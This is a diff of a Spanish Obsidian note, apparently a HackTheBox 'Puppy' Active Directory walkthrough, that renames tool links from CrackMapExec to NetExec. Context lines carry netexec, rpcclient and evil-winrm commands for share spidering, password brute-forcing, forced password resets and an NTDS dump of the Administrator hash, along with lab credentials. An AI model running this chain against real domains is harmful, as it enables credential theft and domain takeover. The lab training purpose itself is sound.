@@ -19,7 +19,7 @@ Los puertos encontrados mas relevantes son:
 5985 - WinRm
 ```
 
-Usaremos [[00.- Herramientas/CRACKMAPEXEC]] para enumerar información básica del servicio **LDAP**.
+Usaremos [[NETEXEC]] para enumerar información básica del servicio **LDAP**.
 `netexec ldap $IP 2>/dev/null` 
 
 ```js
@@ -35,13 +35,13 @@ Usaremos la herramienta de `https://github.com/Gzzcoo/iRealm` para añadir la ma
 `iRealm --force $IP PUPPY.HTB DC`
 
 ### Verificación de credenciales
-Verificamos las credenciales que nos han aportado son validas con [[00.- Herramientas/CRACKMAPEXEC]]
+Verificamos las credenciales que nos han aportado son validas con [[NETEXEC]]
 `netexec ldap $IP -u 'levi.james' -p 'KingofAkron2025!'`
 
 Nos mostrara que las credenciales son validas
 
 #### Búsqueda de información en recursos compartidos
-Buscamos recursos compartidos en el servicio *SMB* con [[00.- Herramientas/CRACKMAPEXEC]]
+Buscamos recursos compartidos en el servicio *SMB* con [[NETEXEC]]
 `netexec smb $IP -u 'levi.james' -p 'KingofAkron2025!' --shares  -M spider_plus`
 
 Usaremos la opción `--shares` para listar los recursos compartidos y el modulo `-M spider_plus` para hacer una búsqueda profunda de recursos compartidos nos genera un archivo `.JSON` en `/root/.nxc/modules/nxc_spider_plus/10.10.11.70.json`
@@ -55,10 +55,10 @@ Luego probaremos con USER:PASS con [[RPCCLIENT]]
 `rpcclient -U 'levi.james%KingofAkron2025!' $IP` -> `enumdomusers`
 Nos enumerara los usuarios del dominio
 
-Enumerar usuarios del dominio con [[00.- Herramientas/CRACKMAPEXEC]] 
+Enumerar usuarios del dominio con [[NETEXEC]] 
 `nxc ldap $IP -u 'levi.james' -p 'KingofAkron2025!' --users`
 
-También podemos usar [[00.- Herramientas/CRACKMAPEXEC]] para enumerar usuarios
+También podemos usar [[NETEXEC]] para enumerar usuarios
 `netexec ldap $IP -u users.txt -p '' -k`
 
  ```ad-note
@@ -99,7 +99,7 @@ No es susceptible al ataque.
 
 ### Recopilación de datos de AD
 
-Recopilaremos unformacion del LDAP y lo guardaremos en un `.zip` que es le usaremos para subir al **BloodHound**, usaremos la herramienta [[00.- Herramientas/CRACKMAPEXEC]]
+Recopilaremos unformacion del LDAP y lo guardaremos en un `.zip` que es le usaremos para subir al **BloodHound**, usaremos la herramienta [[NETEXEC]]
 `netexec ldap $IP -u 'levi.james' -p 'KingofAkron2025!' --bloodhound --collection All --dns-server $IP`
 Usaremos la opción `--bloodhound` que activa el modulo de recolección de datos, usamos también `--collection All` especifica que se usen todos los métodos de recolección de datos. Y `--dns-server $IP` se usa para que la herramienta use el **DC** como DNS.
 
@@ -133,7 +133,7 @@ Veremos que hemos ganado acceso a la carpeta **DEV**, asi que nos metemos en mod
 Nos encontramos que en el directorio hay un archivo con extensión de *keepass* `kdbx` 
 `recovery.kdbx`
 
-Nos descargamos el archivo que hemos encontrado con [[00.- Herramientas/CRACKMAPEXEC]]
+Nos descargamos el archivo que hemos encontrado con [[NETEXEC]]
 `netexec smb $IP -u 'levi.james' -p 'KingofAkron2025!' --share 'DEV' --get-file 'recovery.kdbx' 'recovery.kdbx'`
 
 ```ad-info
@@ -150,7 +150,7 @@ La contraseña que nos devuelve es `liverpool`
 Una vez conseguimos ver los datos de usuarios y passwords guardaremos las contraseñas en un archivo, y junto con los usuarios que encontramos al principio haremos fuerza bruta para ver si alguna contraseña le pertenece a algún usuario. 
 
 #### Verificación de USER::PASS
-Usaremos [[00.- Herramientas/CRACKMAPEXEC]]
+Usaremos [[NETEXEC]]
 `netexec ldap $IP -u users.txt -p pass.txt --continue-on-success | grep '[+]'`
 
 Nos encuentra el siguiente user y su password
@@ -158,7 +158,7 @@ Nos encuentra el siguiente user y su password
 [+] PUPPY.HTB\ant.edwards:Antman2025!
 ```
 
-Volveremos a comprobar que es valido con [[00.- Herramientas/CRACKMAPEXEC]]:
+Volveremos a comprobar que es valido con [[NETEXEC]]:
 `netexec smb $IP -u 'ant.edwards' -p 'Antman2025!'`
 En las carpetas compartidas que tiene acceso observamos que es capad de escribir en **DEV**
 
@@ -196,7 +196,7 @@ Nos indicara que ha sido modificado
 Le volvemos a asignar la nueva contraseña:
 `net rpc password "adam.silver" "newP@ssword2022" -U "puppy.htb"/"ant.edwards"%'Antman2025!' -S $IP`
 
-Y con [[00.- Herramientas/CRACKMAPEXEC]] comprobamos que exista:
+Y con [[NETEXEC]] comprobamos que exista:
 `netexec smb $IP -u 'adam.silver' -p 'newP@ssword2022'`
 
 ```ad-hint
@@ -275,7 +275,7 @@ Usaremos [[impacket-dpapi]] podemos derivar la clave para descifrar la masterkey
 Como es miembro de Administrador y de Remote manager accedemos con [[EVIL-WINRM]]
 `evil-winrm -i 10.10.11.70 -u "steph.cooper_adm" -p 'FivethChipOnItsWay2025!'`
 
-Para poder acceder como usuario Administrator usaremos [[00.- Herramientas/CRACKMAPEXEC]] para obtener el hash del usuario:
+Para poder acceder como usuario Administrator usaremos [[NETEXEC]] para obtener el hash del usuario:
 `netexec smb $IP -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!' --ntds vss --user Administrator`
 
 El hash es: `bb0edc15e49ceb4120c7bd7e6e65d75b`
